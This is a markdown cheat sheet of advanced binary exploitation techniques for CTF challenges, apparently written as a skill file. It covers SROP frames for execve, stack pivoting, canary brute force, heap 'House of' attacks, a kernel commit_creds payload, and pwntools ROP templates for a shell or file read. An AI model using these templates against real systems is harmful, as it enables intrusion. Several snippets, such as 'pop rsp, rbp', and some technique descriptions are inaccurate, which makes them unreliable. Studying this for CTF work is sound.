# CTF Skill: Binary Advanced

## Purpose
Advanced binary exploitation techniques for CTF challenges.

## 64-bit Specific

### Calling Convention
```
System V AMD64 ABI:
1. RDI
2. RSI
3. RDX
4. RCX
5. R8
6. R9
7. Stack (for overflow)
Return: RAX
```

### Address Space
```
Full 64-bit addressable space
But only lower 48 bits typically used
Canonical form: 0x0000... to 0x7FFF...
```

## Stack Pivoting

### Purpose
```
When not enough space for ROP chain
Pivot RSP to controllable buffer
```

### Techniques
```python
# Gadget to pivot
pop rsp, rbp
# or
xchg rsp, rax
xchg rsp, [rbp+0x10]

# Find suitable gadget
ropper --file binary --instructions "xchg rsp, rax"
```

## Sigreturn Oriented Programming (SROP)

### Concept
```python
# Use sigreturn syscall
# Set up fake signal frame
# All registers controllable

SYSCALL = 0x400100  # x86_64 sigreturn

# Build frame
frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.rsp = stack_addr
```

### Why SROP
```
No need for gadgets
All registers via frame
Perfect for post-syscall return
```

## Jump-Oriented Programming (JOP)

### Differences from ROP
```
Similar to ROP but use jump gadgets
Harder to defend against
May have different constraints
```

### Gadget Patterns
```python
# Indirect jump table
jmp qword [rax + 0x40]
# Use as dispatcher
```

## Countermeasures Bypass

### PIE + ASLR + NX
```python
# 1. Leak any address (format string, overflow)
# 2. Calculate base addresses
# 3. Build ROP chain using leaks

# Partial overwrite for 1-byte fix
# PIE often leaves last byte predictable
```

### Full RELRO
```python
# GOT read-only after load
# No GOT overwrite

# Alternative: PLT Injection
# Overwrite PLT entry
```

### Stack Canary
```python
# 1. Leak canary (format string)
# Format string: %23$x or similar

# 2. Bruteforce (byte-by-byte)
for i in range(256):
    payload = offset + byte
    # Check if program continues
```

### Fortify Source
```python
# _chk functions
# __strcpy_chk
# __read_chk

# Still vulnerable with overflow
# Requires different overflow technique
```

## House of Lore

### Technique
```python
# Create fake chunk in BSS
# Use unlink/consolidate to get arbitrary read/write
# Similar to unsorted bin attack
```

## House of Orange

### Technique
```python
# When free() is not available
# Overwrite top chunk
# Trigger malloc_consolidate
# Get arbitrary libc pointers
```

## House of Rabbit

### Technique
```python
# Persist malloc state
# Fastbin attack variant
# Bypass security checks
```

## Kernel Exploitation

### Linux Kernel
```c
// Kernel ROP (KROP)
# Similar to user-space ROP
# Different gadgets

// Kernel payload ideas
commit_creds(prepare_kernel_cred(0))
// Get root shell
```

### CTF Kernel Challenges
```bash
# Extract kernel image
# Extract file system
# Analyze LKM (loadable kernel module)

# Analyze with binwalk
binwalk kernel Image

# Extract with dd
dd if=kernel of=fs.cpio bs=1 skip=$OFFSET
```

## ARM/MIPS/Other

### ARM64 Calling Convention
```
x0-x7: Arguments
x30: LR
sp: Stack pointer
```

### MIPS Calling Convention
```
$a0-$a3: Arguments
$v0: Return value
$ra: Return address
```

### Exploitation
```python
# Similar techniques but different gadgets
# Use appropriate ROP gadget finder
ropper --file binary --arch mips --badbytes 00
```

## One-Gadget

### Finding
```bash
one_gadget libc.so.6
# Output: addresses with constraints
# Constraint: [rsp+0x30] == null
```

### Using
```python
# Choose gadget with feasible constraint
# Control to satisfy constraint
rop.system(binsh, rsp=gadget_addr + constraint_offset)
```

## ROP Chain Templates

### Exec Shell
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

rop = ROP(elf)
rop.raw(rop.search(move=0, regs=['rsi', 'rdi']).address)
rop.raw(b'/bin/sh\x00')
rop.system(next(libc.search(b'/bin/sh\x00')))

io.sendline(flat({offset: rop.chain()}))
```

### Read File
```python
rop = ROP(elf)
rop.open(file_addr, 0)  # open(path, O_RDONLY)
rop.read(3, buffer, 100)  # fd=3 (from open), buf, size
rop.write(1, buffer, 100)  # stdout=1

# Or use mmap + read
```

## Checklist
```
[ ] Run checksec
[ ] Determine vulnerability
[ ] Choose attack method
[ ] Find gadgets
[ ] Build chain
[ ] Test locally
[ ] Get shell
```
